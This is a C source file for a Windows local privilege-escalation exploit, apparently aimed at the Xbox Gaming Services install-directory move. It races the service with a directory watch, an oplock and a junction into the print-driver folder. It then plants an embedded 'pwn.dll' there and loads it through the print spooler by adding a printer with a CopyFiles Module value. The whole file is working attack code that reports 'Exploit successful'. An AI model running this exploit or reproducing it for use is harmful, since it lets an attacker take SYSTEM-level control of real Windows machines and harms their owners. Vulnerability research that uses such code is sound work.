#include "def.h"
HANDLE old_dir, new_dir;
void cb1()
{
    printf("[+] Oplock!\n");
    
    CloseHandle(old_dir);
    Sleep(100);
    CreateJunction(new_dir, L"\\??\\C:\\Windows\\system32\\spool\\drivers\\x64");
}

int wmain()
{
    load();
    
    
    PFILE_NOTIFY_INFORMATION fi = NULL;
    
    
    HANDLE del = CreateFile(L"C:\\XboxGames", DELETE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS|FILE_FLAG_OPEN_REPARSE_POINT, NULL);
    if (del != INVALID_HANDLE_VALUE) {
        if (!Move(del)) {
            printf("[-] Cannot move folder. Exiting");
            return -1;
        }
    }
    CloseHandle(del);
    del = CreateFile(L"C:\\new_install_dir", DELETE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
    if (del != INVALID_HANDLE_VALUE) {
        if (!Move(del)) {
            printf("[-] Cannot move folder. Exiting");
            return -1;
        }
    }
    CloseHandle(del);
    CreateDirectory(L"C:\\new_install_dir",NULL);
    CreateDirectory(L"C:\\XboxGames", NULL);

    CreateDirectory(L"C:\\XboxGames\\GameSave", NULL);
    CreateDirectory(L"C:\\XboxGames\\GameSave\\Content", NULL);
    HANDLE hFile = CreateFile(L"C:\\XboxGames\\GameSave\\Content\\MicrosoftGame.Config", GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, NULL, NULL);
    CHAR junk[] = "dadad";
    DWORD written;
    WriteFile(hFile, junk, sizeof(junk), &written, NULL);
    CloseHandle(hFile);

    if (!SetACL()) {
        return -1;

    } HMODULE hm = GetModuleHandle(NULL);
    HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_DLL), L"dll");
    DWORD DllSize = SizeofResource(hm, res);
    void* DllBuff = LoadResource(hm, res);
    printf("[+] DACL Changed.\n");
    HANDLE  dll = CreateFile(L"C:\\XboxGames\\GameSave\\pwn.dll", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, 0, NULL);
    if (!WriteFile(dll, DllBuff, DllSize, NULL, NULL)) {
        printf("[-] Error [WriteFile]: 0x%x\n", GetLastError());
        return -1;
    }
    printf("[+] DLL written.\n");

    CloseHandle(dll);
    printf("[*] Preparing directory....\n");
    Prepare();
    printf("[*] Change installation directory to: C:\\new_install_dir.\n");

    
    FileOpLock* oplock;
    BOOL done = FALSE;
    DWORD count = 0;
    new_dir = CreateFile(L"C:\\new_install_dir", FILE_WRITE_ATTRIBUTES, FILE_SHARE_DELETE | FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
    
    old_dir = CreateFile(L"C:\\xboxgames", GENERIC_READ, FILE_SHARE_DELETE | FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
    do {
        SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
        SetThreadPriorityBoost(GetCurrentThread(), TRUE);
        SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
        wchar_t buff[4096] = { 0 };
        DWORD ret = 0;
        ReadDirectoryChangesW(old_dir, buff, 4096, TRUE, FILE_NOTIFY_CHANGE_FILE_NAME, &ret, NULL, NULL);
        fi = (PFILE_NOTIFY_INFORMATION)buff;
       
        if ((fi->Action == FILE_ACTION_ADDED) && (wcswcs(fi->FileName, L".tmp_5001"))) {
            
           
               
                
                CloseHandle(old_dir);
                do {
                    old_dir = CreateFile(L"C:\\new_install_dir", GENERIC_WRITE, FILE_SHARE_DELETE | FILE_SHARE_WRITE , NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT|FILE_FLAG_OVERLAPPED, NULL);
                } while (old_dir == INVALID_HANDLE_VALUE);
                oplock = FileOpLock::CreateLock(old_dir, cb1);
                if (oplock != NULL)
                {
                    oplock->WaitForLock(INFINITE);
                }
                done = TRUE;
            
        }
    } while (!done);
    HANDLE success = INVALID_HANDLE_VALUE;
    do
    {
        Sleep(1000);
        success = CreateFile(L"C:\\Windows\\system32\\spool\\drivers\\x64\\GameSave\\pwn.dll", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, 0, NULL);
    } while (success == INVALID_HANDLE_VALUE);
    printf("[+] Exploit successful!\n");
    
    GetPrinterDrivers();
   
}
WCHAR* GetPrinterDrivers()
{
    DRIVER_INFO_1* info;
    LPBYTE data;
    DWORD bytesneeded;
    DWORD ret;
    EnumPrinterDrivers(NULL, NULL, 1, NULL, 0, &bytesneeded, &ret);
    data = (LPBYTE)malloc(bytesneeded);
    if (!EnumPrinterDrivers(NULL, NULL, 1, data, bytesneeded, &bytesneeded, &ret))
    {
        printf("%d\n", GetLastError());
        return NULL;
    }
    info = (DRIVER_INFO_1*)data;
    for (int i = 0; i < ret; i++)
    {
        printf("[*] Trying printer driver: %ls\n", info->pName);
        if (LoadDLL(info->pName)) {
            break;
        }
        info++;
    }
}
VOID Prepare()

{
   
    WCHAR file[256] = { 0x0 };
    for (int i = 0; i < 5001;i++)
    {
       ;
        swprintf(file, L"C:\\xboxgames\\.tmp_%d", i);
        HANDLE h = CreateFile(file, GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
        CloseHandle(h);
        memset(file, 0x0, 256);
    }
}
BOOL LoadDLL(WCHAR* printdrv) {
    PRINTER_INFO_2 printInfo;
    WCHAR dll[256] = L"C:\\Windows\\System32\\spool\\drivers\\x64\\GameSave\\pwn.dll";
    RPC_WSTR str_uuid;
    UUID uuid = { 0 };
    UuidCreate(&uuid);
    UuidToString(&uuid, &str_uuid);
    memset(&printInfo, 0, sizeof(PRINTER_INFO_2));
    printInfo.pPrinterName = (LPWSTR)str_uuid;
    printInfo.pDriverName = printdrv;
    printInfo.pPortName = (LPWSTR)L"PORTPROMPT:";
    printInfo.pDatatype = (LPWSTR)L"RAW";
    printInfo.pPrintProcessor = (LPWSTR)L"winprint";
    HANDLE hPrinter = AddPrinter(NULL, 2, (LPBYTE)&printInfo);
    if (hPrinter == NULL) {
        printf("[-] Error [AddPrinter]: 0x%x\n", GetLastError());
       
        return FALSE;
    }
    printf("[+] Printer added!\n");
    SetPrinterDataEx(hPrinter, L"CopyFiles\\", L"Module", 1, (LPBYTE)&dll, sizeof(dll));
    printf("[+] DLL should be loaded!\n");

    return TRUE;
}
VOID cb0()
{
    printf("[+] Oplock.\n");
    hDir = CreateFile(L"C:\\new_install_dir", FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
    CreateJunction(hDir, L"\\??\\C:\\Windows\\system32\\spool\\drivers\\x64");
   // DosDeviceSymLink(L"Global\\GLOBALROOT\\RPC Control\\GameSave", BuildPath(L"C:\\windows\\temp\\test1::$INDEX_ALLOCATION"));


}
INT GetCurrentUserSid(PSID* sid)
{
    DWORD i, dwSize = 0;
    HANDLE hToken;
    PTOKEN_USER user;
    TOKEN_INFORMATION_CLASS TokenClass = TokenUser;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_READ | TOKEN_QUERY, &hToken))
    {
        printf("[-] Error [OpenProcessToken]: 0x%x\n", GetLastError());
        return -1;
    }
 

    GetTokenInformation(hToken, TokenClass, NULL, 0, &dwSize);

    user = (PTOKEN_USER)LocalAlloc(GPTR, dwSize);
    if (!GetTokenInformation(hToken, TokenClass, user, dwSize, &dwSize))
    {
        printf("[-] Error [GetTokenInformation]:  0x%x\n", GetLastError());
        return -1;
    }
  

    DWORD dw_sid_len = GetLengthSid(user->User.Sid);
    *sid = (SID*)LocalAlloc(GPTR, dw_sid_len);
    CopySid(dw_sid_len, *sid, user->User.Sid);
    return 0;
}
BOOL SetACL()
{
    PACL pNewDACL = NULL;
    PACL pOldDACL = NULL;
    PSID current_user = NULL;
    DWORD sid_size = SECURITY_MAX_SID_SIZE;
    PSECURITY_DESCRIPTOR pSD = NULL;
    GetCurrentUserSid(&current_user);
    EXPLICIT_ACCESS ea;
    ZeroMemory(&ea, 1 * sizeof(EXPLICIT_ACCESSA));
    ea.grfAccessPermissions = DELETE;
    ea.grfAccessMode = DENY_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea.Trustee.ptstrName = (WCHAR*)current_user;
    if (GetNamedSecurityInfo(L"C:\\XboxGames\\GameSave", SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &pOldDACL, NULL, &pSD) != ERROR_SUCCESS) 
    {
        printf("[-] Error [GetNamedSecurityInfo]:  0x%x\n", GetLastError());
        return FALSE;
    }
    if (SetEntriesInAcl(1, &ea, pOldDACL, &pNewDACL) != ERROR_SUCCESS) 
    {
        printf("[-] Error [SetEntriesInAcl]:  0x%x\n", GetLastError());
        return FALSE;
    }
    HANDLE hFile = CreateFile(L"C:\\XboxGames\\GameSave", WRITE_DAC|GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[-] Error [CreateFile]:  0x%x\n", GetLastError());
        return FALSE;
    }
    if (SetSecurityInfo(hFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pNewDACL, NULL) != ERROR_SUCCESS)
    {
        printf("[-] Error [SetSecurityInfo]:  0x%x\n", GetLastError());
        return FALSE;
    }
    CloseHandle(hFile);
    return TRUE; 
}
BOOL CreateJunction(HANDLE hDir, LPCWSTR target) {
    HANDLE hJunction;
    DWORD cb;
    wchar_t printname[] = L"";
    if (hDir == INVALID_HANDLE_VALUE) {
        printf("[!] HANDLE invalid!\n");
        return FALSE;
    }
    SIZE_T TargetLen = wcslen(target) * sizeof(WCHAR);
    SIZE_T PrintnameLen = wcslen(printname) * sizeof(WCHAR);
    SIZE_T PathLen = TargetLen + PrintnameLen + 12;
    SIZE_T Totalsize = PathLen + (DWORD)(FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer));
    PREPARSE_DATA_BUFFER Data = (PREPARSE_DATA_BUFFER)malloc(Totalsize);
    Data->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    Data->ReparseDataLength = PathLen;
    Data->Reserved = 0;
    Data->MountPointReparseBuffer.SubstituteNameOffset = 0;
    Data->MountPointReparseBuffer.SubstituteNameLength = TargetLen;
    memcpy(Data->MountPointReparseBuffer.PathBuffer, target, TargetLen + 2);
    Data->MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2);
    Data->MountPointReparseBuffer.PrintNameLength = (USHORT)PrintnameLen;
    memcpy(Data->MountPointReparseBuffer.PathBuffer + wcslen(target) + 1, printname, PrintnameLen + 2);
    WCHAR dir[MAX_PATH] = { 0x0 };
    if (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, &cb, NULL) != 0)
    {

        GetFinalPathNameByHandle(hDir, dir, MAX_PATH, 0);
        printf("[+] Junction %ls -> %ls created!\n", dir, target);
        free(Data);
        return TRUE;

    }
    else
    {

        printf("[!] Error: %d. Exiting\n", GetLastError());
        free(Data);
        return FALSE;
    }
}
BOOL DeleteJunction(HANDLE handle) {
    REPARSE_GUID_DATA_BUFFER buffer = { 0 };
    BOOL ret;
    buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    DWORD cb = 0;
    IO_STATUS_BLOCK io;
    if (handle == INVALID_HANDLE_VALUE) {
        printf("[!] HANDLE invalid!\n");
        return FALSE;
    }
    WCHAR dir[MAX_PATH] = { 0x0 };
    if (DeviceIoControl(handle, FSCTL_DELETE_REPARSE_POINT, &buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, NULL, NULL, &cb, NULL)) {
        GetFinalPathNameByHandle(handle, dir, MAX_PATH, 0);
        printf("[+] Junction %ls deleted!\n", dir);
        return TRUE;
    }
    else
    {
        printf("[!] Error: %d.\n", GetLastError());
        return FALSE;
    }
}

BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
    if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) {
        printf("[+] Symlink %ls -> %ls created!\n", object, target);
        return TRUE;

    }
    else
    {
        printf("error :%d\n", GetLastError());
        return FALSE;

    }
}

BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
    if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, object, target)) {
        printf("[+] Symlink %ls -> %ls deleted!\n", object, target);
        return TRUE;

    }
    else
    {
        printf("error :%d\n", GetLastError());
        return FALSE;


    }
}
HANDLE myCreateDirectory(LPWSTR file, DWORD access, DWORD share, DWORD dispostion) {
    UNICODE_STRING ufile;
    HANDLE hDir;
    pRtlInitUnicodeString(&ufile, file);
    OBJECT_ATTRIBUTES oa = { 0 };
    IO_STATUS_BLOCK io = { 0 };
    InitializeObjectAttributes(&oa, &ufile, OBJ_CASE_INSENSITIVE, NULL, NULL);

    retcode = pNtCreateFile(&hDir, access, &oa, &io, NULL, FILE_ATTRIBUTE_NORMAL, share, dispostion, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);

    if (!NT_SUCCESS(retcode)) {
        return NULL;
    }
    return hDir;
}
LPWSTR  BuildPath(LPCWSTR path) {
    wchar_t ntpath[MAX_PATH];
    swprintf(ntpath, L"\\??\\%s", path);
    return ntpath;
}
VOID load() {
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    if (ntdll != NULL) {
        pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
        pNtCreateFile = (_NtCreateFile)GetProcAddress(ntdll, "NtCreateFile");

        pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, "NtSetInformationFile");
    }
    if (pRtlInitUnicodeString == NULL || pNtCreateFile == NULL || pNtSetInformationFile == NULL) {
        printf("Cannot load api's %d\n", GetLastError());
        exit(0);
    }


}
BOOL Move(HANDLE hFile) {
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Invalid handle!\n");
        return FALSE;
    }
    wchar_t tmpfile[MAX_PATH] = { 0x0 };
    RPC_WSTR str_uuid;
    UUID uuid = { 0 };
    UuidCreate(&uuid);
    UuidToString(&uuid, &str_uuid);
    _swprintf(tmpfile, L"\\??\\C:\\windows\\temp\\%s", str_uuid);
    size_t buffer_sz = sizeof(FILE_RENAME_INFO) + (wcslen(tmpfile) * sizeof(wchar_t));
    FILE_RENAME_INFO* rename_info = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, buffer_sz);
    IO_STATUS_BLOCK io = { 0 };
    rename_info->ReplaceIfExists = TRUE;
    rename_info->RootDirectory = NULL;
    rename_info->Flags = 0x00000001 | 0x00000002 | 0x00000040;
    rename_info->FileNameLength = wcslen(tmpfile) * sizeof(wchar_t);
    memcpy(&rename_info->FileName[0], tmpfile, wcslen(tmpfile) * sizeof(wchar_t));
    NTSTATUS status = pNtSetInformationFile(hFile, &io, rename_info, buffer_sz, 65);
    if (status != 0) {
        return FALSE;
    }
    return TRUE;
}